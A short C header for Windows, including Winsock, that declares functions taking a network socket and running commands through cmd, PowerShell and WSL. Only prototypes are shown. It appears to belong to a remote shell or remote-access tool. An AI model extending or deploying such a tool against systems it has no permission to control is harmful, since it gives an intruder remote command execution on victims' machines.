#pragma once
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>

#define BUFFER_SIZE_DEFAULT 4096
#pragma comment (lib, "Ws2_32.lib")

void cmd_command(SOCKET socks_instance, char* command);
void powershell_command(SOCKET socks_instance, char* command);
void wsl_command(SOCKET socks_instance, char* command);
void execute_cmd(SOCKET socks_instance);
void execute_powershell(SOCKET socks_instance);
void execute_wsl(SOCKET socks_instance);